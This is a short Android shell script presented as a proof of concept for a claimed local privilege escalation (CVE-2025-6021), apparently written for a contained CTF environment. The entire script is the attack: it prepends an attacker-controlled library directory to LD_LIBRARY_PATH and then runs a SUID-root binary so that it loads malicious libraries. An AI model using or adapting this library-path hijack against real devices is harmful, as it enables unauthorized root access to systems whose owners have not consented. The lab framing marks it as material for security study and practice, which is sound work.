#!/system/bin/sh
# PoC for CVE-2025-6021: LPE via Insecure SSH Environment Processing on Android
# This PoC demonstrates an exploitation scenario where an attacker’s SSH session on an
# Android device can override the dynamic linker search path to trigger a vulnerable SUID-root binary.
#
# Pre-Requisites:
#   - A vulnerable SSH service on Android that does not sanitize environment variables.
#   - An attacker-controlled directory at /data/local/tmp/insecure_lib containing malicious libraries.
#   - A SUID-root binary at /system/bin/vuln_exec that insecurely uses LD_LIBRARY_PATH.
#
# Exploitation Steps:
#  1. Override LD_LIBRARY_PATH to include /data/local/tmp/insecure_lib.
#  2. Execute /system/bin/vuln_exec so that it loads attacker-controlled libraries.
#
# Note: This script is intended solely for use in our safely contained, emulated CTF environment.

export LD_LIBRARY_PATH="/data/local/tmp/insecure_lib:${LD_LIBRARY_PATH}"
echo "LD_LIBRARY_PATH overridden: ${LD_LIBRARY_PATH}"

echo "Triggering the vulnerable binary..."
/system/bin/vuln_exec
